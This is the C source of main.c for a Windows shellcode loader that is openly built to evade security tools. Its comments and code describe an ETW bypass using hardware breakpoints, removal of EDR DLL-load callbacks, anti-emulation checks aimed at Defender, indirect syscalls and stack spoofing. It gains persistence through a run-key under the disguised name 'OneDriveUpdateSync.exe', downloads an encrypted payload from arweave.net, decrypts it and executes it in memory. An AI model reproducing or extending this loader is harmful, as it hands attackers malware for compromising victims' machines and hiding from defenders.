// =============================================
// main.c - Shellcode Loader
//
// Evasion:  Patchless ETW (VEH + HW breakpoints)
// Memory:   NtAllocateVirtualMemory (in-process)
// Exec:     Poison Fiber (primary) / TP callback (fallback)
// Stack:    Call gadget injection + tail-call spoofing
// Syscalls: Indirect with randomized gadget pool
// Crypto:   Chaskey-CTR (replaces RC4/SystemFunction032)
// Compress: LZNT1 via ntdll (optional, per-build)
// =============================================

#include "Common.h"

// NOTE: No static URL or key data in the binary.
// FetchArweaveMeta() in Arweave.c queries arweave.net/graphql for the newest
// confirmed zero-loader TX from the wallet in Payload.h, downloads the TX data,
// and parses the combined header (hex_key|hex_nonce|size|compressed|<binary>).
// The encrypted payload bytes are returned directly — no second HTTP call.

// -----------------------------------------------
// Entry Point
// -----------------------------------------------
int Main(VOID) {

    NTAPI_FUNC  NtApis  = { 0 };
    API_HASHING WinApis = { 0 };

    // --- IAT Camouflage ---
    IatCamouflage();
    LOG("[*] Main entry");

    // --- Anti-Analysis (skipped in DEBUG builds) ---
#ifndef DEBUG
    if (!AntiAnalysis())
        return 0;
    // Anti-emulation: burn mpengine's wall-clock budget + detect emulator
    // characteristics (RDRAND determinism, CPUID hypervisor brand). Defender
    // emulates the first 10-100k instructions of a sample; if we don't bail
    // here we still execute on real silicon, but the emulator may sign us
    // based on emulated behaviour. Caller passes pApi NULL since WinApi
    // hashing hasn't been initialized yet; AntiEmulation uses intrinsics only.
    if (!AntiEmulation(NULL))
        return 0;
#endif

    // --- Initialize indirect syscall engine ---
    // Builds gadget pool (all syscall;ret in ntdll) + resolves 6 NT syscalls
    if (!InitializeNtSyscalls(&NtApis))
        return 0;
    LOG("[+] Syscalls initialized");

    // --- Initialize WinAPI function pointers (PEB hash walking) ---
    if (!InitializeWinApis(&WinApis))
        return 0;
    LOG("[+] WinApis initialized");

    // --- Blind EDR DLL load monitoring ---
    // Removes all LdrRegisterDllNotification callbacks so EDR
    // can't see subsequent LoadLibrary calls (amsi, wininet, ktmw32)
    BlindDllNotifications(&WinApis);

    // --- Shuffled DLL preload ---
    // Load the three flow-critical DLLs in per-run randomized order so
    // kernel ETW image-load sequence can't be learned by ML baselining.
    // Subsequent LoadLibraryA calls in Evasion/Staging hit the
    // loader cache and emit no further image-load events.
    BYTE xAmsi[]    = XSTR_AMSI_DLL;    DEOBF(xAmsi);
    BYTE xWininet[] = XSTR_WININET_DLL; DEOBF(xWininet);
    LPCSTR preload[] = { (LPCSTR)xAmsi, (LPCSTR)xWininet };
    ShufflePreloadLibraries(&WinApis, preload, 2);

    // --- Patchless ETW bypass ---
    // VEH + hardware breakpoint on EtwEventWrite (DR0)
    // NtContinue sets DR0 without ETW-TI telemetry
    PatchlessEtw(&WinApis);

    // --- Install / self-guard ---
    // EXE first run:  self-guard fails → copy self + write HKCU run-key → NtTerminateProcess.
    //                 OS fires run-key at next logon; never touches network here.
    // EXE reboot:     self-guard fires (basename == OneDriveUpdateSync.exe) → fall through to download.
    //
    // Sideload first run: self-guard fails (no /pf) → copy files + write HKCU run-key → NtTerminateProcess.
    // Sideload reboot:    self-guard fires (/pf) → fall through to download.
#ifndef BUILD_DLL
    InstallAndContinue(&WinApis);
#else
    SideloadInstallAndContinue(&WinApis);
#endif

    // --- Resolve beacon + download payload in one step ---
    // FetchArweaveMeta queries arweave.net/graphql for the newest confirmed
    // zero-loader TX from the wallet in Payload.h, downloads the TX data, and
    // parses the combined header (hex_key|hex_nonce|size|compressed|<binary>).
    // The encrypted payload bytes come back directly — no second HTTP call.
    PBYTE pPayload      = NULL;
    DWORD dwPayloadSize = 0;
    BYTE  aKey[KEY_SIZE] = { 0 };
    BYTE  aNonce[12]     = { 0 };
    DWORD dwOrigSize    = 0;
    BOOL  bCompressed   = FALSE;

    LOG("[*] Resolving beacon and downloading payload from Arweave...");
    if (!FetchArweaveMeta(&WinApis, &pPayload, &dwPayloadSize, aKey, aNonce, &dwOrigSize, &bCompressed))
        return 0;
    LOG("[+] Payload loaded");

    // --- Decrypt with Chaskey-CTR ---
    if (!ChaskeyCtrDecrypt(pPayload, dwPayloadSize, aKey, aNonce)) {
        HeapFree(GetProcessHeap(), 0, pPayload);
        MemSet(aKey,   0, KEY_SIZE);
        MemSet(aNonce, 0, sizeof(aNonce));
        return 0;
    }
    LOG("[+] Payload decrypted");

    // Wipe key material immediately
    MemSet(aKey,   0, KEY_SIZE);
    MemSet(aNonce, 0, sizeof(aNonce));

    // --- Decompress (if payload was LZNT1-compressed) ---
    // bCompressed and dwOrigSize come from the on-chain memo, not from
    // compile-time defines — the same binary handles any future payload.
    PBYTE pShellcode      = pPayload;
    DWORD dwShellcodeSize = dwPayloadSize;

    if (bCompressed) {
        PBYTE pDecompressed = NULL;
        if (!DecompressPayload(&WinApis, pPayload, dwPayloadSize, &pDecompressed, dwOrigSize)) {
            LOG("[!] Decompression failed");
            HeapFree(GetProcessHeap(), 0, pPayload);
            return 0;
        }
        LOG("[+] Payload decompressed");

        MemSet(pPayload, 0, dwPayloadSize);
        HeapFree(GetProcessHeap(), 0, pPayload);
        pShellcode      = pDecompressed;
        dwShellcodeSize = dwOrigSize;
    }

    // ============================================================
    // Evasion cleanup — remove VEH handler + clear debug registers
    // ============================================================
    CleanupEvasion(&WinApis);
    LOG("[+] Evasion cleanup complete");

    // ============================================================
    // Execute shellcode in the current process.
    //
    // Primary path: Poison Fiber
    //   ConvertThreadToFiber + CreateFiber(SpoofCallback) + SwitchToFiber
    //   No new OS thread — PsSetCreateThreadNotifyRoutine never fires.
    //
    // Fallback path: NT thread pool
    //   TpAllocWork(SpoofCallback) + TpPostWork
    //   Main thread waits alertable on NtCurrentProcess pseudo-handle
    //   (Wait:UserRequest, not Wait:DelayExecution — defeats BeaconHunter).
    // ============================================================
    LOG("[*] Executing shellcode in current process...");
    if (!ExecuteInProcess(&NtApis, &WinApis, pShellcode, dwShellcodeSize)) {
        MemSet(pShellcode, 0, dwShellcodeSize);
        HeapFree(GetProcessHeap(), 0, pShellcode);
        return 0;
    }

    // Wipe the heap copy — shellcode is now running from its own allocation.
    MemSet(pShellcode, 0, dwShellcodeSize);
    HeapFree(GetProcessHeap(), 0, pShellcode);
    return 0;
}
